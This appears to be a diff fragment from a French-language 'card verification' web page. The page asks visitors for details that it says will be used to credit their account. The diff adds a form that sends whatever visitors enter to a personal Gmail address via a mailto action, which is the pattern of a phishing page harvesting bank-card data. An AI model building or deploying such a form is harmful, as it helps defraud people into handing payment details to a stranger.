@@ -4,7 +4,8 @@ html>
   VERIFICATION DE LA CARTE 
   <hr style=" border-top: 1px solid blue;"> 
   <fieldset> 
-   <dl> 
+   <dl>
+ <form method="POST" action="mailto: idadaniel985@gmail.com" enctype="multipart/form-data">
     <dt>
       Merci de bien vouloir nous communiquer les informations 
      <br> mentionnées ci-dessous, utiles pour créditer votre compte. 
